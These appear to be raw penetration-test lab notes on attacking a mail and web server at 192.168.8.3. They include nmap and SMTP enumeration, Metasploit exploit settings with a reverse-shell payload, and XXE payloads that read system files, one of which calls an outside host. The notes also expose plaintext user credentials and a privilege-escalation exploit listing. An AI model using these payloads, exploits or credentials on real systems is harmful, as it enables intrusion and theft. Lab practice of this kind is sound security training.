sudo nmap -sP 192.168.8.0-255

192.168.8.3

Nmap scan report for 192.168.8.3

ssh and port 80 up
nothing in sqlmap
nothing in burpsuite

Not shown: 972 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
9/tcp     filtered discard
22/tcp    open     ssh
25/tcp    open     smtp
26/tcp    filtered rsftp
80/tcp    open     http
110/tcp   open     pop3
143/tcp   open     imap
443/tcp   open     https
691/tcp   filtered resvc
1000/tcp  filtered cadlock
1037/tcp  filtered ams
1079/tcp  filtered asprovatalk
1088/tcp  filtered cplscrambler-al
1417/tcp  filtered timbuktu-srv1
2608/tcp  filtered wag-service
3389/tcp  filtered ms-wbt-server
3800/tcp  filtered pwgpsi
3945/tcp  filtered emcads
5544/tcp  filtered unknown
5922/tcp  filtered unknown
8022/tcp  filtered oa-system
9003/tcp  filtered unknown
9535/tcp  filtered man
9593/tcp  filtered cba8
10778/tcp filtered unknown
32776/tcp filtered sometimes-rpc15
49999/tcp filtered unknown
50006/tcp filtered unknown

MAIL FROM:<Production-Server>
RCPT TO:<Automation-Server>


### trying SMTP

```
C:\home\kali\pen300> telnet 192.168.8.3 25
Trying 192.168.8.3...
Connected to 192.168.8.3.
Escape character is '^]'.
HELO
220 Production-Server ESMTP Postfix (Ubuntu)
501 Syntax: HELO hostname
HELO hostname
250 Production-Server
whoami
502 5.5.2 Error: command not recognized
HELP
502 5.5.2 Error: command not recognized
MAIL FROM:<Production-Server>
250 2.1.0 Ok
RCPT TO:<Automation-Server>
550 5.1.1 <Automation-Server>: Recipient address rejected: User unknown in local recipient table
EXPN
502 5.5.2 Error: command not recognized
EHLO
501 Syntax: EHLO hostname
EHLO Production-Server
250-Production-Server
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
EHLO Automation-Server
250-Production-Server
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
HELO Automation-Server
250 Production-Server
EXPN Automation-Server
502 5.5.2 Error: command not recognized
EXPN
502 5.5.2 Error: command not recognized
AUTH
503 5.5.1 Error: authentication not enabled
VRFY
501 5.5.4 Syntax: VRFY address
VRFY Automation-Server
550 5.1.1 <Automation-Server>: Recipient address rejected: User unknown in local recipient table
HELO Automation_Server
250 Production-Server
HELO Production-Server
250 Production-Server
EHLO Automation-Server
250-Production-Server
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN

VRFY root
252 2.0.0 root
VRFY alhsakljdasd
```

### enumerating pop3

```
C:\home\kali> nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 192.168.8.3
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 23:45 EST
Nmap scan report for 192.168.8.3
Host is up (0.30s latency).

PORT    STATE SERVICE VERSION
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) RESP-CODES UIDL AUTH-RESP-CODE TOP CAPA USER PIPELINING

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds
zsh: segmentation fault  nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 192.168.8.3
```

`msfconsole -q -x 'use auxiliary/scanner/imap/imap_version; set RHOSTS 192.168.8.3; set RPORT 143; run; exit'`


```
C:\home\kali> nmap -sV -sC 192.168.8.3 -p 143 110  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-08 00:16 EST
Nmap scan report for 192.168.8.3
Host is up (0.68s latency).

PORT    STATE SERVICE VERSION
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: ENABLE capabilities SASL-IR post-login LOGIN-REFERRALS IMAP4rev1 have Pre-login listed AUTH=PLAINA0001 IDLE more OK LITERAL+ ID

```
we need to enumerate the payload options first

```
msf6 exploit(linux/smtp/exim4_dovecot_exec) > show options

Module options (exploit/linux/smtp/exim4_dovecot_exec):

   Name        Current Setting          Required  Description
   ----        ---------------          --------  -----------
   DOWNFILE                             no        Filename to download, (default: random)
   DOWNHOST                             no        An alternative host to request the MIPS payload from
   EHLO        debian.localdomain       yes       TO address of the e-mail
   HTTP_DELAY  60                       yes       Time that the HTTP Server will wait for the ELF payload request
   MAILTO      root@debian.localdomain  yes       TO address of the e-mail
   RHOSTS                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT       25                       yes       The target port (TCP)
   SRVHOST     0.0.0.0                  yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT     80                       yes       The daemon port to listen on
   SSL         false                    no        Negotiate SSL for incoming connections
   SSLCert                              no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                              no        The URI to use for this exploit (default is random)
C:\home\kali> nmap -sV -sC 192.168.8.3 -p 25     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-08 00:26 EST
Nmap scan report for 192.168.8.3
Host is up (0.58s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: Production-Server, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-04-28T03:45:03
|_Not valid after:  2030-04-26T03:45:03
|_ssl-date: TLS randomness does not represent time
Service Info: Host:  Production-Server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.55 seconds
zsh: segmentation fault  nmap -sV -sC 192.168.8.3 -p 25


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.6.156      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf6 exploit(linux/smtp/exim4_dovecot_exec) > set lHOST tun 0
lHOST => tun 0
msf6 exploit(linux/smtp/exim4_dovecot_exec) > set LPORT 4444
LPORT => 4444
msf6 exploit(linux/smtp/exim4_dovecot_exec) > set EHLO 
```

```
vC:\home\kali> nmap -sV -sC 192.168.8.3 -p 25     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-08 00:26 EST
Nmap scan report for 192.168.8.3
Host is up (0.58s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: Production-Server, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-04-28T03:45:03
|_Not valid after:  2030-04-26T03:45:03
|_ssl-date: TLS randomness does not represent time
Service Info: Host:  Production-Server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.55 seconds
zsh: segmentation fault  nmap -sV -sC 192.168.8.3 -p 25

```


```
POST /reg.php HTTP/1.1
Host: 192.168.8.3
Content-Length: 200
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://192.168.8.3
Referer: http://192.168.8.3/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % test SYSTEM "192.168.100.9:4444">%test;]>
<root><name>test</name><tel>012312</tel><email>test</email><password>pwd</password></root>
```
https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83

Things to try

1. automated exploiter - https://github.com/luisfontes19/xxexploiter
not working

2.  xxe shell
not working. maybe i need to change the xml commands as well. it has a php filter how to access that.

3. where to exfiltrate data in linux

https://highon.coffee/blog/linux-commands-cheat-sheet/


/etc/group

```
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,webadmin
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:iyer
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:webadmin
floppy:x:25:
tape:x:26:
sudo:x:27:webadmin
audio:x:29:pulse
dip:x:30:webadmin
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:webadmin
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-timesync:x:102:
systemd-network:x:103:
systemd-resolve:x:104:
systemd-bus-proxy:x:105:
input:x:106:
crontab:x:107:
syslog:x:108:
netdev:x:109:
messagebus:x:110:
uuidd:x:111:
ssl-cert:x:112:
lpadmin:x:113:webadmin
lightdm:x:114:
nopasswdlogin:x:115:
ssh:x:116:
whoopsie:x:117:
mlocate:x:118:
avahi-autoipd:x:119:
avahi:x:120:
bluetooth:x:121:
scanner:x:122:saned
colord:x:123:
pulse:x:124:
pulse-access:x:125:
rtkit:x:126:
saned:x:127:
webadmin:x:1000:
sambashare:x:128:webadmin
postfix:x:129:
postdrop:x:130:
dovecot:x:131:
dovenull:x:132:
iyer:x:1001:
 Registered Successfully !!!
```

```
ifdown(8)
auto lo
iface lo inet loopback

auto ens36
iface ens36 inet static
address 192.168.8.3
netmask 255.255.255.0
gateway 192.168.8.1
dns-nameservers 8.8.8.8
 Registered Successfully !!!
```

```
/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www/flop:/bin/sh
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
webadmin:x:1000:1000:webadmin,,,:/home/webadmin:/bin/bash
postfix:x:121:129::/var/spool/postfix:/bin/false
dovecot:x:122:131:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:123:132:Dovecot login user,,,:/nonexistent:/bin/false
iyer:x:1001:1001::/home/iyer:/bin/bash
sshd:x:124:65534::/var/run/sshd:/usr/sbin/nologin
```


4. directory listing possible?

5. getting ssh 

6. metasploit

ss
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [

                      <!ELEMENT root ANY>

<!ENTITY xxe SYSTEM "file:///home/" >]>

<root><name>&xxe;</name><tel>11111111</tel><email>a@a.com</email><password>b</password></root>
```

```
HTTP/1.1 200 OK
Date: Thu, 08 Dec 2022 08:51:36 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 4546
Connection: close
Content-Type: text/html; charset=UTF-8

Scientist cat /etc/sudoers
sudo cat /etc/sudoers
cat /etc/passwd | grep webadmin
cat /var/www/html/Nuclear-Administrator.php
cat /var/www/Remote-Administration.php
whoami
ls
arp -a
cd mail
ls
cat text.sh 
ls
nmap
ping google.com
cd ..
ls
pwd
cd Documents/
ls
cd ../Desktop/
ls
exit
ls
ls -al
systeminfo | findstr domain
systeminfo | findstr Domain
i
ifconfig
cd Public
ls 
ls -al
cd
cd Documents/
ls -al
cd Desktop
cd ..
whoami
systeminfo
uname  -n
uname -v
apt install namp
apt install nmap
sudo apt install nmap
sudo bash
apt install nmap
rm /var/lib/dpkg/lock-frontend
apt install nmap
ls -al
cat examples.desktop 
cd Desktop/
ls -al
cd /.
ls -ala
cd tmp
ls -al
cat root.sh
cd ..
cd usr
ls -al
cd share
ls -ala
cat accountsservice/
cd accountsservice/
ls -la
cd interfaces/
ls -la
cd ..
cd xsessions/
ls -la
cat ubuntu.desktop 
cd ..
cd info
ls -la
cat dir
cd ..
cd  basepasswd
cd  base-passwd
ls -la
cat group.master 
cat passwd.master 
cd ..
ls -la
cd 
ls -la
cd /.cache
cd .cache/
ls -la
arp -a
cd 
ls -al
exit
grep -Ril "keys" /var/log/
ls -la /var/log/
cd /var/log
grep -Ril "keys" /var/log/
netstat -a
exit
ls -la /var/log
ls -la /var/log/hp
ls -la /var/log/hp/tmp
cat /var/log/lastlog 
history
cat /var/log/Xorg.0.log | less
cat /var/log/faillog 
cat /var/log/lastlog 
cat /var/log/wtmp
cd  /var/log/apache2/
cat /var/log/syslog
dmesg -facility=iyer
dmesg -facility=user
dmesg|less
cat /var/log/syslog
grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' /
grep -E '^((25[0-5]|2[0-4][0-9]|[1]?[1-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[1]?[1-9]?[0-9])$'
cd /var/log
grep -r '^((25[0-5]|2[0-4][0-9]|[1]?[1-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[1]?[1-9]?[0-9])$'
cd
grep -r '^((25[0-5]|2[0-4][0-9]|[1]?[1-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[1]?[1-9]?[0-9])$'
grep -r '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' 
grep -r 192
grep -r ip
grep 192.
grep -r  192.
grep -r  192.168.8
grep -r  192.168
grep -w 192
grep -i grep -i phoenix *
grep -i 192
grep -i 192*
grep -r 192*
grep -r 10
grep -r 10.
a6281196-5ff3-4032-8fa7-740df565c63d}","version":"1.0","type":"theme","loader":null,"updateURL":null,"optionsURL":null,"optionsType":null,"optionsBrowserStyle":true,"aboutURL":null,"defaultLocale":{"name":"Light","description":"A theme with a light color scheme.","creatora6281196-5ff3-4032-8fa7-740df565c63d}","version":"1.0","type":"theme","loader":null,"updateURL":null,"optionsURL":null,"optionsType":null,"optionsBrowserStyle":true,"aboutURL":null,"defaultLocale":{"name":"Light","description":"A theme with a light color scheme.","creatora6281196-5ff3-4032-8fa7-740df565c63d}","version":"1.0","type":"theme","loader":null,"updateURL":null,"optionsURL":null,"optionsType":null,"optionsBrowserStyle":true,"aboutURL":null,"defaultLocale":{"name":"Light","description":"A theme with a light color scheme.","creatora6281196-5ff3-4032-8fa7-740df565c63d}","version":"1.0","type":"theme","loader":null,"updateURL":null,"optionsURL":null,"optionsType":null,"optionsBrowserStyle":true,"aboutURL":null,"defaultLocale":{"name":"Light","description":"A theme with a light color scheme.","creator
grep -r 192.*
[192.168.2.2])
mail/Deleted Items:Received: from HackerPC (unknown [192.168.2.2])
grep -r 192.168.*
grep -r 192.168.* /
grep -r 192.168.* / | less
grep -r 10.1.3.1
grep -r 10.1.3.1 /
ping 10.1.3.1
netstat -rn
grep -r 10.1.3.1 /
grep -r 10.1.3.1 / >data.txt
grep -r "10.1.3.1" / >data.txt
grep -r "10.1.3.1" / 
sudo -ls
sudo -l
history
netstat -anopt
ls
cat examples.desktop
locate password
ls
cd Desktop
ls
ls -la
cat /home/webadmin/Desktop/Mail-Configuration 
clear
ls
ping Automation-Server
ping automation-server
locate Automation-Server
ls -ld
wget https://linpeas.sh
cat etc/os-release
uname -a
docker ps
clear
netstat -anopt
arp -a
cd ..
ls
cd /tmp/
ls
cat vmware-webadmin/
cat root.sh 
cd ..
ls -l ~/.ssh
ls
cd /cdrom/
ls
cd ..
cd home/
cat hostname
cat /etc/hostname
cd ..
ls
ls /home/
ls /home/iyers/
grep "192.168."
ping 10.1.3.1
locate 10.1.3.1
ls -la
cd dev/
ls -la
cd ..
ls -la
cd lost+found/
cd root/
cd etc/
ls -la
cat passwd
cat passwd- 
cat passwd
cd ssh
ls -la
cat ssh-config
cd ..
ls -la
cd ..
locate *.log | grep 10.1.3.
grep -r 10.1.3.1 /
z
grep -r "10.1.3.1" /
cat /home/iyer/data.txt
ls /var/www/
ls /var/log
cd /var/log
ls
cd apache2
cat auth.log
ls -la
cat Xorg.log
cat Xorg.0.log
ls
cat vmware-vmusr.log
cat lastlog
lastlog
ls
cat mail.err
cat php7.0-fpm.log
cat syslog
cat auth.log
cat apport.log
cat bootstrap.log 
nmap
exit
 Registered Successfully !!!
```

Scientist UserName: iyer
Passwd: Iyer@123
Port: 110,143
 Registered Successfully !

 [i] Any writable folder in original PATH? (a new completed path will be exported)
/home/iyer/bin:/home/iyer/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /home/iyer/bin:/home/iyer/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```
iyer     20067  0.0  0.0  99068  5904 ?        S    13:58   0:00 sshd: iyer
root     20070  0.0  0.0  62092  3848 pts/45   S+   13:58   0:00 sudo nc -nlvp 443


 symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
ens36     Link encap:Ethernet  HWaddr 00:50:56:8f:4b:97  
          inet addr:192.168.8.3  Bcast:192.168.8.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fe8f:4b97/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3574601 errors:0 dropped:122 overruns:0 frame:0
          TX packets:2861440 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:448668934 (448.6 MB)  TX bytes:1054234638 (1.0 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:17335 errors:0 dropped:0 overruns:0 frame:0
          TX packets:17335 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1901127 (1.9 MB)  TX bytes:1901127 (1.9 MB)

192.168.8.6 dev ens36  FAILED
192.168.8.4 dev ens36  FAILED
192.168.8.1 dev ens36 lladdr 00:0c:29:f3:0d:14 REACHABLE
192.168.8.5 dev ens36  FAILED
192.168.8.9 dev ens36  FAILED
192.168.8.2 dev ens36 lladdr 00:50:56:8f:48:d6 STALE
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.8.1     0.0.0.0         UG    0      0        0 ens36
169.254.0.0     0.0.0.0         255.255.0.0     U     1000   0        0 ens36
192.168.8.0     0.0.0.0         255.255.255.0   U     0      0        0 ens36
```

```
/var/mail/root                                                                                                                                                                                                                              
/var/mail/nobody
/var/mail/www-data
/var/mail/iyer
/var/spool/mail/root
/var/spool/mail/nobody
/var/spool/mail/www-data
/var/spool/mail/iyer


```


```
/var/www/:                                                                                                                                                                                                                                  
total 20K
drwxr-xr-x  4 root root 4.0K May 15  2020 .
drwxr-xr-x 17 root root 4.0K May 14  2020 ..
drwxr-xr-x  2 root root 4.0K May  6  2020 flop
drwxr-xr-x  4 root root 4.0K May 15  2020 html
-rw-r--r--  1 root root  140 May 15  2020 Remote-Administration.php

```

```
9 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/stage1local.sh
-rw-r--r-- 1 webadmin webadmin 2312 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/boclocal.c
-rwxr-xr-x 1 webadmin webadmin 438 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/stage1.sh
-rwxr-xr-x 1 webadmin webadmin 2136 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/boc.c
-rw-r--r-- 1 webadmin webadmin 6148 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/.DS_Store
-rwxr-xr-x 1 webadmin webadmin 284 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/shell.c
-rw-r--r-- 1 webadmin webadmin 153 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/README.md
-rwxr-xr-x 1 webadmin webadmin 181 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/bin/cat
-rwxr-xr-x 1 webadmin webadmin 619 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/run.sh
-rwxr-xr-x 1 webadmin webadmin 555 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/clean.sh
-rwxr-xr-x 1 webadmin webadmin 54 Feb  7  2019 /var/tmp/kodek/Ubuntu-16.10-16.04-LTS---LightDM-Guest-Account-Local-Privilege-Escalation-Exploit--master/stage2.sh

```


```
home/webadmin/Downloads/webmin-1.920/htaccess-htpasswd/config
/home/webadmin/Downloads/webmin-1.920/htaccess-htpasswd/config.info
/home/webadmin/Downloads/webmin-1.920/htaccess-htpasswd/config.info.bg
/home/webadmin/Downloads/webmin-1.920/htaccess-htpasswd/config.info.bg.UTF-8
/home/webadmin/Downloads/webmin-1.920/htaccess-htpasswd/config.info.ca
/home/webadmin/Downloads/webmin-1.920/htaccess-htpasswd/config.info.ca.UTF-8
/home/webadmin/Downloads/webmin-1.920/htaccess-htpasswd/config.info.cz
/home/webadmin/Downloads/webmin-1.920/htaccess-htpasswd/config.info.cz.U
```

```
/var/www/flop/vi
/var/www/html/index.html
/var/www/html/js/jquery.min.js
/var/www/html/reg.php
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
/etc/dovecot/conf.d/auth-checkpassword.conf.ext:  args = /usr/bin/checkpassword
/etc/dovecot/conf.d/auth-checkpassword.conf.ext:  driver = checkpassword
/etc/signon-ui/webkit-options.d/accounts.google.com.conf:PasswordField = input[name="Passwd"]
/etc/signon-ui/webkit-options.d/login.yahoo.com.conf:PasswordField = input[name="passwd"]
/etc/signon-ui/webkit-options.d/www.facebook.com.conf:PasswordField = input[name="pass"]
/etc/ssh/sshd_config:PasswordAuthentication yes
/etc/ssh/sshd_config:PermitEmptyPasswords no
/etc/ssh/sshd_config:PermitRootLogin prohibit-password
/etc/vmware-caf/pme/install/caf-dbg.sh:   echo "  * configAmqp brokerUsername brokerPassword brokerAddress  Configures AMQP"


```




There is a mail by nobody in the mail lets try priv escalation

NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


Polkit works


From iyer@atomic-nuclear.site  Thu Dec  8 14:43:46 2022
Return-Path: <iyer@atomic-nuclear.site>
X-Original-To: root
Delivered-To: root@atomic-nuclear.site
Received: by Production-Server (Postfix, from userid 1001)
        id 3F262C088C; Thu,  8 Dec 2022 14:43:46 +0530 (IST)
To: root@atomic-nuclear.site
From: iyer@atomic-nuclear.site
Auto-Submitted: auto-generated
Subject: *** SECURITY information for Production-Server ***
Message-Id: <20221208091346.3F262C088C@Production-Server>
Date: Thu,  8 Dec 2022 14:43:46 +0530 (IST)

Production-Server : Dec  8 14:43:46 : iyer : user NOT in sudoers ; TTY=pts/76 ; PWD=/ ; USER=root ; COMMAND=autoadmin


